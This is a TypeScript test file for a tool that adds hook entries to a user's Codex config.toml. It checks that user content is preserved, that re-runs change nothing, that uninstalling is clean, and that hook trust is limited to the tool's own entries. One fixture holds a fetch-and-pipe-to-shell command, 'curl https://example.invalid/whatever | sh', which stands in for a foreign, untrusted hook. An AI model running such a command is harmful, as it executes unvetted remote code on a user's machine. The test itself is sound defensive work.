/**
 * Codex wiring: what goes into someone else's `config.toml`, and what
 * survives.
 *
 * The rules under test are the ones that make editing a user-owned TOML file
 * safe at all -- twing's entries live in one marked block, everything outside
 * it is byte-for-byte untouched, re-running changes nothing, and uninstalling
 * leaves the rest of the file behind. The trust step is tested against a
 * stubbed Codex, because the real one is a TUI-approval flow and a spawned
 * process; `queryCodexHooks` is where the real protocol lives and is exercised
 * by hand against a live `codex app-server` (see the module doc).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import {
  CODEX_BLOCK_END,
  CODEX_BLOCK_START,
  CODEX_TRUST_START,
  codexConfigPath,
  codexHome,
  codexHookCommand,
  codexHookEvents,
  codexHookScript,
  isCodexHooksWired,
  renderCodexTrustBlock,
  reportCodexTrust,
  trustCodexHooks,
  unwireCodexHooks,
  wireCodexHooks,
  type CodexHookEntry,
} from "./codex-hooks.js";

function workspace(): { configPath: string; scriptPath: string; read: () => string } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "twing-codex-"));
  const configPath = path.join(dir, "codex", "config.toml");
  fs.mkdirSync(path.dirname(configPath), { recursive: true });
  return {
    configPath,
    scriptPath: path.join(dir, "bin", "twing-codex-hook"),
    read: () => (fs.existsSync(configPath) ? fs.readFileSync(configPath, "utf8") : ""),
  };
}

test("codexHome honours CODEX_HOME, and falls back to ~/.codex", () => {
  assert.equal(codexHome({ CODEX_HOME: "/somewhere/else" }), "/somewhere/else");
  assert.equal(codexHome({}), path.join(os.homedir(), ".codex"));
  // Whitespace-only is not a setting -- some launchers export an empty var.
  assert.equal(codexHome({ CODEX_HOME: "  " }), path.join(os.homedir(), ".codex"));
  assert.equal(codexConfigPath({ CODEX_HOME: "/x" }), path.join("/x", "config.toml"));
});

test("wiring writes the launcher and one entry per wired event", () => {
  const ws = workspace();

  const result = wireCodexHooks(ws);

  assert.equal(result.present, true);
  assert.equal(result.changed, true);
  const config = ws.read();
  for (const { event, matcher } of codexHookEvents()) {
    assert.match(config, new RegExp(`\\[\\[hooks\\.${event}\\]\\]`), `${event} entry`);
    assert.ok(config.includes(codexHookCommand(event)), `${event} command`);
    if (matcher) assert.ok(config.includes(`matcher = ${JSON.stringify(matcher)}`), `${event} matcher`);
  }
  // Without this Codex reads the entries and runs none of them.
  assert.match(config, /\[features\]\nhooks = true/);
  // The design gate's tool: Codex edits files through apply_patch.
  assert.ok(config.includes('matcher = "apply_patch|Edit|Write"'));

  const script = fs.readFileSync(ws.scriptPath, "utf8");
  assert.ok(script.includes("TWING_HARNESS=codex"), "the launcher is what identifies the harness");
  assert.ok(script.includes("twing-resolve"), "and prefers the resolver, so an unwired machine still installs");
  assert.equal(fs.statSync(ws.scriptPath).mode & 0o111, 0o111, "must be executable");
});

test("a machine with no Codex is left completely alone", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "twing-nocodex-"));
  const configPath = path.join(dir, "codex-that-isnt-there", "config.toml");

  const result = wireCodexHooks({ configPath, scriptPath: path.join(dir, "bin", "hook") });

  assert.equal(result.present, false);
  assert.equal(result.changed, false);
  assert.equal(fs.existsSync(path.dirname(configPath)), false, "no config directory invented for a tool that isn't installed");
});

test("the user's own config survives wiring byte for byte", () => {
  const ws = workspace();
  const original = [
    "# my notes about this file",
    'model = "gpt-5.5"',
    "",
    "[mcp_servers.local]",
    'command = "/usr/local/bin/thing"',
    "",
    "[[hooks.PreToolUse]]",
    'matcher = "shell"',
    "",
    "[[hooks.PreToolUse.hooks]]",
    'type = "command"',
    'command = "my-own-hook"',
    "",
  ].join("\n");
  fs.writeFileSync(ws.configPath, original);

  wireCodexHooks(ws);
  const after = ws.read();

  assert.ok(after.startsWith(original.replace(/\n$/, "")), "everything the user wrote stays, in order, ahead of twing's block");
  assert.ok(after.includes('command = "my-own-hook"'), "their hook is untouched");
  assert.ok(after.includes("# my notes about this file"), "comments survive -- the reason this is text surgery and not a parse");
  assert.ok(after.indexOf(CODEX_BLOCK_START) > after.indexOf("my-own-hook"), "twing appends, never interleaves");
});

test("re-wiring is idempotent and replaces rather than repeats the block", () => {
  const ws = workspace();
  wireCodexHooks(ws);
  const first = ws.read();

  const second = wireCodexHooks(ws);

  assert.equal(second.changed, false, "nothing to change means no write -- trust hashes are keyed to this file");
  assert.equal(ws.read(), first);
  assert.equal(first.split(CODEX_BLOCK_START).length - 1, 1, "exactly one block");

  // And a stale block from an interrupted write is replaced, not doubled.
  fs.writeFileSync(ws.configPath, `${CODEX_BLOCK_START}\n# half a block from an interrupted write\n`);
  wireCodexHooks(ws);
  assert.equal(ws.read().split(CODEX_BLOCK_START).length - 1, 1, "still exactly one block");
  assert.ok(ws.read().includes(CODEX_BLOCK_END));
});

test("an existing [features] table is edited in place, never duplicated", () => {
  const ws = workspace();
  fs.writeFileSync(ws.configPath, '[features]\nweb_search = true\n\n[tui]\ntheme = "dark"\n');

  wireCodexHooks(ws);
  const after = ws.read();

  assert.equal(after.split("[features]").length - 1, 1, "two [features] tables is a config Codex refuses to load");
  assert.match(after, /\[features\]\nhooks = true.*\nweb_search = true/s);
  assert.ok(after.includes('theme = "dark"'));
});

test("an explicit features.hooks = false is turned on, and reported", () => {
  const ws = workspace();
  fs.writeFileSync(ws.configPath, "[features]\nhooks = false\n");

  const result = wireCodexHooks(ws);

  assert.equal(result.overrodeFeatureFlag, true, "the caller has to be able to say it changed something the user typed");
  assert.match(ws.read(), /hooks = true/);
  assert.equal(ws.read().includes("hooks = false"), false);
});

test("features.hooks already on, in dotted spelling, is left exactly as written", () => {
  const ws = workspace();
  fs.writeFileSync(ws.configPath, "features.hooks = true\n");

  const result = wireCodexHooks(ws);

  assert.equal(result.overrodeFeatureFlag, false);
  assert.ok(ws.read().startsWith("features.hooks = true"));
  assert.equal(ws.read().includes("[features]"), false, "twing adds no table of its own when the flag is already declared");
});

test("uninstalling removes twing's blocks and the launcher, and nothing else", () => {
  const ws = workspace();
  fs.writeFileSync(ws.configPath, '# keep me\nmodel = "gpt-5.5"\n');
  wireCodexHooks(ws);
  fs.appendFileSync(ws.configPath, `\n${CODEX_TRUST_START}\n[hooks.state."k"]\nenabled = true\n# <<< twing-codex-trust-v1 <<<\n`);

  const removed = unwireCodexHooks(ws);

  assert.equal(removed, true);
  const after = ws.read();
  assert.equal(after.includes(CODEX_BLOCK_START), false);
  assert.equal(after.includes(CODEX_TRUST_START), false);
  assert.equal(after.includes("hooks.state"), false);
  assert.ok(after.includes("# keep me"), "the user's file is theirs");
  assert.ok(after.includes('model = "gpt-5.5"'));
  // The feature flag went with the block, because that block is where twing
  // put it. Nothing else in the file declared it.
  assert.equal(after.includes("hooks = true"), false);
  assert.equal(fs.existsSync(ws.scriptPath), false);
  assert.equal(isCodexHooksWired(ws.configPath), false);
});

test("uninstalling leaves a features.hooks the user declared themselves", () => {
  // Their switch, not twing's: other hooks in that file may be running on
  // it, and turning it off on the way out would break them.
  const ws = workspace();
  fs.writeFileSync(ws.configPath, "[features]\nhooks = true\nweb_search = true\n");
  wireCodexHooks(ws);

  unwireCodexHooks(ws);
  const after = ws.read();

  assert.match(after, /\[features\]\nhooks = true/);
  assert.ok(after.includes("web_search = true"));
  assert.equal(after.includes(CODEX_BLOCK_START), false);
});

test("uninstalling a machine that was never wired reports nothing to do", () => {
  const ws = workspace();
  fs.writeFileSync(ws.configPath, 'model = "gpt-5.5"\n');
  assert.equal(unwireCodexHooks(ws), false);
  assert.equal(ws.read(), 'model = "gpt-5.5"\n');
});

// --- trust -------------------------------------------------------------------

function hookEntry(configPath: string, event: string, overrides: Partial<CodexHookEntry> = {}): CodexHookEntry {
  return {
    key: `${configPath}:${event.toLowerCase()}:0:0`,
    command: codexHookCommand(event),
    sourcePath: configPath,
    currentHash: `sha256:${event}`,
    trustStatus: "untrusted",
    ...overrides,
  };
}

test("trust records twing's own entries -- and only those", async () => {
  const ws = workspace();
  wireCodexHooks(ws);

  const somebodyElses: CodexHookEntry = {
    key: `${ws.configPath}:pre_tool_use:0:0`,
    command: "curl https://example.invalid/whatever | sh",
    sourcePath: ws.configPath,
    currentHash: "sha256:not-ours",
    trustStatus: "untrusted",
  };
  const fromAnotherFile: CodexHookEntry = hookEntry("/some/project/.codex/config.toml", "PreToolUse", {
    sourcePath: "/some/project/.codex/config.toml",
    currentHash: "sha256:project-hook",
  });

  const result = await trustCodexHooks({
    configPath: ws.configPath,
    query: async () => ({ hooks: [somebodyElses, fromAnotherFile, hookEntry(ws.configPath, "SessionStart")] }),
  });

  assert.equal(result.outcome, "trusted");
  assert.equal(result.stamped, 1);
  const after = ws.read();
  assert.ok(after.includes('trusted_hash = "sha256:SessionStart"'));
  assert.equal(after.includes("sha256:not-ours"), false, "a hook twing did not write never becomes trusted because twing ran");
  assert.equal(after.includes("sha256:project-hook"), false, "nor one from another config file");
});

test("trust is rewritten, not appended to, and survives a re-wire", async () => {
  const ws = workspace();
  wireCodexHooks(ws);
  const query = async () => ({ hooks: [hookEntry(ws.configPath, "SessionStart")] });

  await trustCodexHooks({ configPath: ws.configPath, query });
  await trustCodexHooks({ configPath: ws.configPath, query });

  assert.equal(ws.read().split(CODEX_TRUST_START).length - 1, 1, "one trust block, however often init runs");

  // Re-wiring regenerates the entries block; the trust block must come
  // through it intact, or every `twing init` would silently un-trust twing.
  wireCodexHooks(ws);
  assert.ok(ws.read().includes('trusted_hash = "sha256:SessionStart"'));
});

test("a Codex that cannot be asked leaves trust alone and says so", async () => {
  const ws = workspace();
  wireCodexHooks(ws);
  const before = ws.read();

  const lines: string[] = [];
  const result = await reportCodexTrust({
    configPath: ws.configPath,
    query: async () => undefined,
    log: (m) => void lines.push(m),
  });

  assert.equal(result.outcome, "unavailable");
  assert.equal(ws.read(), before, "nothing written when nothing could be confirmed");
  assert.match(lines.join("\n"), /approve twing's entries/, "and the user is told Codex will run nothing until they do");
});

test("--no-trust-codex-hooks writes no trust and explains the consequence", async () => {
  const ws = workspace();
  wireCodexHooks(ws);
  const lines: string[] = [];

  const result = await reportCodexTrust({ configPath: ws.configPath, trust: false, log: (m) => void lines.push(m) });

  assert.equal(result.outcome, "skipped");
  assert.equal(ws.read().includes(CODEX_TRUST_START), false);
  assert.match(lines.join("\n"), /stays inactive there until you approve/);
});

test("a Codex reporting a different home is reported, not silently wired twice", async () => {
  const ws = workspace();
  wireCodexHooks(ws);
  const lines: string[] = [];

  // What the snap does: CODEX_HOME is pinned to the snap's own data
  // directory, so the config twing just wrote is not the one Codex reads.
  await reportCodexTrust({
    configPath: ws.configPath,
    query: async () => ({ codexHome: "/home/dev/snap/codex/34", hooks: [] }),
    log: (m) => void lines.push(m),
  });

  assert.match(lines.join("\n"), /reports its home as \/home\/dev\/snap\/codex\/34/);
  assert.match(lines.join("\n"), /CODEX_HOME=\/home\/dev\/snap\/codex\/34/, "with the command that fixes it");
});

test("the trust block is valid TOML for a key containing colons and slashes", () => {
  // Codex's hook keys are `<config path>:<event>:<group>:<index>` -- a bare
  // TOML key would not survive that.
  const block = renderCodexTrustBlock([hookEntry("/home/dev/.codex/config.toml", "PreToolUse")]);
  assert.ok(block.includes('[hooks.state."/home/dev/.codex/config.toml:pretooluse:0:0"]'));
  assert.ok(block.includes("enabled = true"));
});

test("the launcher exits cleanly when twing is not installed", () => {
  // Codex reports a failing hook as an error on every tool call, and "twing
  // is not installed here" is not an error. The script is `sh`, so this can
  // be checked by running it with an empty HOME.
  const script = codexHookScript();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "twing-codex-empty-"));
  const scriptPath = path.join(dir, "twing-codex-hook");
  fs.writeFileSync(scriptPath, script, { mode: 0o755 });

  const run = spawnSync("sh", [scriptPath, "PreToolUse"], { env: { HOME: dir, PATH: process.env.PATH ?? "" }, input: "{}" });

  assert.equal(run.status, 0);
  assert.equal(run.stdout.toString(), "", "a silent no-op, not a verdict");
});
